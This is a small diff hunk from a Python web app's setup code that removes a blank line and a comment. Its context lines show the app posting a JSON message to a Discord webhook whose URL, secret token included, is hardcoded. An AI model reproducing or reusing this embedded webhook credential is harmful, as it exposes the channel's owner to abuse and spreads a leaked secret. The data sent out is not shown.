@@ -56,10 +56,7 @@ def create_app():
         payload = json.dumps(messageeeee)
         headers = {'Content-Type': 'application/json'}
         requests.post("https://discord.com/api/webhooks/1220549855185997935/mkFuF-omKjobn77rSBMPqC6cYz2ddGUZGGc0VigjLs0J43cGwApQtQUlB6s1tDuCIQnt",data=payload,headers=headers)
-        
 
-
-    # Before request callback to check if the user is logged in
     def before_request():
 
         excluded_routes = [
